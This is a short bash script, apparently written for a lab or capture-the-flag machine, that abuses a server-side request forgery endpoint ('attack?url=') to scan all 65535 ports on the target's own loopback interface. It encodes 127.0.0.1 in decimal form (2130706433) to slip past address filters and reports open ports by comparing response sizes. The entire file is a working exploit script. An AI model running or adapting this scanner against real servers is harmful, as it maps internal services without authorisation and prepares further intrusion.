#!/bin/bash


for i in {1..65535};
	do cmd=$(curl -so /dev/null http://10.10.112.120:8000/attack?url=http://2130706433:${i} -w '%{size_download}');
	if [ $cmd != 1045 ]; 
		then
			echo "Open Port: $i"
	fi
done 